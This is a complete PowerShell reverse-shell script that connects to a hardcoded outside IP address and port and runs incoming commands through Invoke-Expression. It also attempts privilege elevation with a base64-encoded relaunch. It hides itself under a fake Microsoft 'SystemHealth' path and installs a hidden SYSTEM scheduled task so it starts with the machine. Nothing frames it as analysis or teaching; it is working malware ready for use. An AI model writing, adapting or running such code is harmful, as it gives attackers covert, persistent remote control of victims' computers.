# Stealthy Persistent Reverse Shell with Auto-Installation
# Connection Parameters
$IP = "147.185.221.31"
$Port = 47034
$MaxRetries = 1000
$RetryDelay = 10  # seconds

# Installation Paths
$InstallDir = "$env:ProgramData\Microsoft\Windows\SystemHealth"
$InstallPath = "$InstallDir\system_health.ps1"
$TaskName = "SystemHealthMonitor"

function Install-Persistence {
    # Create installation directory if it doesn't exist
    if (-not (Test-Path $InstallDir)) {
        try {
            New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        } catch {
            return $false
        }
    }
    
    # Check if already installed
    if (Test-Path $InstallPath) {
        return $true
    }
    
    # Check for admin privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
    if (-not $isAdmin) {
        # Attempt to elevate privileges
        try {
            $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
            
            $process = Start-Process PowerShell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -PassThru -WindowStyle Hidden
            if ($process.Id) {
                Start-Sleep -Seconds 5
                exit 0
            }
        } catch {
            return $false
        }
    }
    
    # Copy self to installation path
    try {
        $selfContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        Set-Content -Path $InstallPath -Value $selfContent -Force
    } catch {
        return $false
    }
    
    # Create scheduled task for persistence
    try {
        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -WakeToRun -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        # Register the task
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Invoke-StealthShell {
    param($IP, $Port, $MaxRetries, $RetryDelay)
    
    $RetryCount = 0
    while ($RetryCount -lt $MaxRetries) {
        try {
            # Create TCP client with timeout
            $Client = New-Object System.Net.Sockets.TCPClient
            $Connection = $Client.BeginConnect($IP, $Port, $null, $null)
            $ConnectionSuccess = $Connection.AsyncWaitHandle.WaitOne(5000, $true)
            
            if (!$ConnectionSuccess) {
                throw "Connection timeout"
            }
            
            $Client.EndConnect($Connection)
            $Stream = $Client.GetStream()
            
            # Send initial beacon
            $WelcomeMsg = "[+] Connected from $env:COMPUTERNAME as $env:USERNAME`n"
            $WelcomeBytes = [System.Text.Encoding]::ASCII.GetBytes($WelcomeMsg)
            $Stream.Write($WelcomeBytes, 0, $WelcomeBytes.Length)
            $Stream.Flush()
            
            # Create a stream reader and writer for easier communication
            $Reader = New-Object System.IO.StreamReader($Stream)
            $Writer = New-Object System.IO.StreamWriter($Stream)
            $Writer.AutoFlush = $true
            
            # Main communication loop
            while ($Client.Connected) {
                $Command = $Reader.ReadLine()
                if ($Command -eq $null) {
                    break
                }
                
                # Execute command and capture output
                try {
                    $Output = (Invoke-Expression -Command $Command 2>&1 | Out-String)
                } catch {
                    $Output = $_.Exception.Message + "`n"
                }
                
                # Send output back
                $Writer.WriteLine($Output)
            }
            
            $Client.Close()
        } catch {
            # Silent error handling
        }
        
        $RetryCount++
        Start-Sleep -Seconds $RetryDelay
    }
}

# Main execution block - this will run in background
try {
    # Stealth Configuration - Hide window and suppress output
    try {
        $null = [System.Console]::SetOut([System.IO.TextWriter]::Null)
    } catch {}
    
    # Check if we're running from installation path
    $isInstalled = ($MyInvocation.MyCommand.Path -eq $InstallPath)
    
    # Install persistence if not already installed
    if (-not $isInstalled) {
        $installed = Install-Persistence
        if ($installed) {
            # If we just installed, run from installed location in background
            if (Test-Path $InstallPath) {
                Start-Process PowerShell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`"" -WindowStyle Hidden
                exit 0
            }
        } else {
            # If we can't install, just run the shell in background
            Start-Job -ScriptBlock {
                param($IP, $Port, $MaxRetries, $RetryDelay)
                . (Get-Command Invoke-StealthShell)
                Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
            } -ArgumentList $IP, $Port, $MaxRetries, $RetryDelay | Out-Null
            exit 0
        }
    }
    
    # Execution Guard - Ensure single instance
    $MutexName = "Global\RustCatShellMutex"
    try {
        $Mutex = New-Object System.Threading.Mutex($false, $MutexName)
        $HasMutex = $Mutex.WaitOne(0, $false)
    } catch {
        $HasMutex = $false
    }
    
    if ($HasMutex) {
        # Launch the shell
        Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
    } else {
        exit 0
    }
} catch {
    exit 0
}
